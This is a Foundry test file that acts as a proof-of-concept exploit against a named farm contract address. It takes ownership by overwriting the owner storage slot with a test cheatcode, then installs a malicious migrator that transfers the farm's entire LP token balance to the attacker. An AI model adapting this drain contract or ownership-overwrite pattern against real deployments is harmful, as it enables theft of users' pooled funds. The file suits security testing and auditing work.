pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ─── Interfaces ──────────────────────────────────────────────

interface IInspexFarm {
    function owner() external view returns (address);
    function poolLength() external view returns (uint256);
    function poolInfo(uint256) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accInspexPerShare);
    function add(uint256 allocPoint, address lpToken, bool withUpdate) external;
    function setMigrator(address _migrator) external;
    function migrate(uint256 _pid) external;
}

interface IMigrator {
    function migrate(IERC20 token) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

// ─── Helper Contracts ────────────────────────────────────────

contract MaliciousMigrator is IMigrator {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function migrate(IERC20 token) external override {
        // msg.sender is the farm contract that calls this function.
        // The farm contract must approve this contract before calling this function.
        // We drain all of the specified tokens from the farm to the attacker.
        uint256 balance = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, attacker, balance);
    }
}

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Mock LP";
    string public symbol = "MLP";
    uint8 public decimals = 18;

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(balanceOf[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(allowance[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");

        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        allowance[sender][msg.sender] -= amount;
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}


// ─── Test Contract ───────────────────────────────────────────

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4B6c8959a41475347226d51f37eC9a1E09F39a92;
    address attacker = address(this);

    IInspexFarm internal farm = IInspexFarm(TARGET);
    IERC20 internal lpToken;
    MaliciousMigrator internal maliciousMigrator;
    uint256 internal poolId;
    address internal owner;


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Forcefully take ownership of the farm contract by overwriting the owner storage slot
        // Standard Ownable contracts store the owner at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 ownerValue = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, ownerValue);
        assertEq(farm.owner(), attacker, "Failed to become owner");

        // Deploy a mock LP token
        MockERC20 mockLp = new MockERC20();
        lpToken = IERC20(address(mockLp));

        // As the new owner, add a new pool for our mock token
        farm.add(100, address(lpToken), false);
        poolId = farm.poolLength() - 1;

        // Seed the farm contract with the mock LP tokens to be stolen
        uint256 amountToSteal = 100 ether;
        mockLp.mint(TARGET, amountToSteal);

        assertEq(lpToken.balanceOf(TARGET), amountToSteal);
        assertEq(lpToken.balanceOf(attacker), 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        maliciousMigrator = new MaliciousMigrator(attacker);

        uint256 initialAttackerBalance = lpToken.balanceOf(attacker);

        // As owner, set the malicious migrator and trigger the migration
        farm.setMigrator(address(maliciousMigrator));
        farm.migrate(poolId);

        uint256 finalAttackerBalance = lpToken.balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

